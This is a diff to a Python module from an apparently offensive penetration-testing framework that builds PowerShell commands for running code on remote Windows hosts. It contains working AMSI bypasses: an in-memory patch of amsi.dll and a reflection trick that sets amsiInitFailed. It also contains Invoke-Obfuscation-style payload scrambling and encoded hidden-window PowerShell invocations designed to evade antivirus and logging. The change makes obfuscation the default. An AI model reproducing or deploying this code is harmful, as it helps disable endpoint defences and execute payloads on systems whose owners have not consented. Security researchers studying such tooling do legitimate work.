@@ -5,12 +5,12 @@
 import re
 from base64 import b64encode
 from string import ascii_lowercase
-from random import choice, sample
+from random import choice, sample,choices
 
 ############################
 # PS Code Execution on Host
 ############################
-def create_ps_command(ps_command, logger, force_ps32=False, obfs=False, server_os='Windows'):
+def create_ps_command(ps_command, logger, force_ps32=False, no_obfs=False, server_os='Windows'):
     logger.debug('Generating PowerShell command')
 
     amsi_bypass = create_amsi_bypass(server_os)
@@ -38,7 +38,9 @@ else
     else:
         command = amsi_bypass + ps_command
 
-    if obfs:
+    if no_obfs:
+        command = 'powershell.exe -noni -nop -w 1 -enc {}'.format(encode_ps_command(command).decode("utf-8"))
+    else:
         obfs_attempts = 0
         while True:
             command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "{}"'.format(invoke_obfuscation(command))
@@ -49,14 +51,14 @@ else
                 logger.fail('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
                 raise Exception('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
             obfs_attempts += 1
-    else:
-        command = 'powershell.exe -noni -nop -w 1 -enc {}'.format(encode_ps_command(command).decode("utf-8"))
-        if len(command) > 8191:
-            logger.fail('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
-            raise Exception('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
+
+    if len(command) > 8191:
+        logger.fail('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
+        raise Exception('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
     return command
 
 def create_amsi_bypass(server_os):
+    # Stolen From: https://github.com/awsmhacks/CrackMapExtreme/blob/master/cmx/helpers/powershell.py
     """AMSI bypasses are an ever-changing p.i.t.a
 
         The default bypass is from amonsec and released around july/2019
@@ -68,13 +70,13 @@ def create_amsi_bypass(server_os):
 
     # bypass from amonsec. tweaked and made reliable by the homie @nixbyte
     # https://gist.githubusercontent.com/amonsec/986db36000d82b39c73218facc557628/raw/6b8587154ac478091388bc56d9a04283953800b8/AMSI-Bypass.ps1
-    amsi_bypass = """$kk='using System;using System.Runtime.InteropServices;public class kk {[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule,string lpProcName);[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string lpLibFileName);[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out uint lpflOldProtect);}';Add-Type $kk;$oldProtectionBuffer=0;[IntPtr]$address=[IntPtr]::Add([kk]::GetProcAddress([kk]::LoadLibrary("amsi.dll"),"DllCanUnloadNow"),2000);[kk]::VirtualProtect($address, [uint32]2, 4, [ref]$oldProtectionBuffer)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([byte[]] (0x31,0xC0,0xC3),0,$address,3);[kk]::VirtualProtect($address,[uint32]2,$oldProtectionBuffer,[ref]$oldProtectionBuffer)|Out-Null;"""
-
     if "2012" in server_os or "7601" in server_os:
         amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 try{
 [Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
 }catch{}"""
+    else:
+        amsi_bypass = """$kk='using System;using System.Runtime.InteropServices;public class kk {[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule,string lpProcName);[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string lpLibFileName);[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out uint lpflOldProtect);}';Add-Type $kk;$oldProtectionBuffer=0;[IntPtr]$address=[IntPtr]::Add([kk]::GetProcAddress([kk]::LoadLibrary("amsi.dll"),"DllCanUnloadNow"),2000);[kk]::VirtualProtect($address, [uint32]2, 4, [ref]$oldProtectionBuffer)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([byte[]] (0x31,0xC0,0xC3),0,$address,3);[kk]::VirtualProtect($address,[uint32]2,$oldProtectionBuffer,[ref]$oldProtectionBuffer)|Out-Null;"""
     return amsi_bypass
 
 ############################
@@ -83,8 +85,12 @@ try{
 def encode_ps_command(command):
     return b64encode(command.encode('UTF-16LE'))
 
-# Following was stolen from https://raw.githubusercontent.com/GreatSCT/GreatSCT/templates/invokeObfuscation.py
+
 def invoke_obfuscation(scriptString):
+    """
+    Taken from the GreatSCT project
+    https://raw.githubusercontent.com/GreatSCT/GreatSCT/master/Tools/Bypass/bypass_common/invoke_obfuscation.py
+    """
 
     # Add letters a-z with random case to $RandomDelimiters.
     alphabet = ''.join(choice([i.upper(), i]) for i in ascii_lowercase)
@@ -97,7 +103,7 @@ def invoke_obfuscation(scriptString):
         randomDelimiters.append(i)
 
     # Only use a subset of current delimiters to randomize what you see in every iteration of this script's output.
-    randomDelimiters = [choice(randomDelimiters) for _ in range(int(len(randomDelimiters)/4))]
+    randomDelimiters = choices(randomDelimiters, k=int(len(randomDelimiters)/4))
 
     # Convert $ScriptString to delimited ASCII values in [Char] array separated by random delimiter from defined list $RandomDelimiters.
     delimitedEncodedArray = ''
@@ -205,28 +211,6 @@ def invoke_obfuscation(scriptString):
 
     obfuscatedPayload = choice(invokeOptions)
 
-    """
-    # Array to store all selected PowerShell execution flags.
-    powerShellFlags = []
-    noProfile = '-nop'
-    nonInteractive = '-noni'
-    windowStyle = '-w'
-    # Build the PowerShell execution flags by randomly selecting execution flags substrings and randomizing the order.
-    # This is to prevent Blue Team from placing false hope in simple signatures for common substrings of these execution flags.
-    commandlineOptions = []
-    commandlineOptions.append(noProfile[0:randrange(4, len(noProfile) + 1, 1)])
-    commandlineOptions.append(nonInteractive[0:randrange(5, len(nonInteractive) + 1, 1)])
-    # Randomly decide to write WindowStyle value with flag substring or integer value.
-    commandlineOptions.append(''.join(windowStyle[0:randrange(2, len(windowStyle) + 1, 1)] + choice([' '*1, ' '*2, ' '*3]) + choice(['1','h','hi','hid','hidd','hidde'])))
-    # Randomize the case of all command-line arguments.
-    for count, option in enumerate(commandlineOptions):
-        commandlineOptions[count] = ''.join(choice([i.upper(), i.lower()]) for i in option)
-    for count, option in enumerate(commandlineOptions):
-        commandlineOptions[count] = ''.join(option)
-    commandlineOptions = sample(commandlineOptions, len(commandlineOptions)) 
-    commandlineOptions = ''.join(i + choice([' '*1, ' '*2, ' '*3]) for i in commandlineOptions)
-    obfuscatedPayload = 'powershell.exe ' + commandlineOptions + newScript
-    """
     return obfuscatedPayload
 
 
@@ -297,4 +281,3 @@ if (($injected -eq $False) -or ($inject_once -eq $False)){{
         return gen_ps_iex_cradle(context, 'Invoke-PSInject.ps1', ps_code, post_back=False)
 
     return ps_code
-
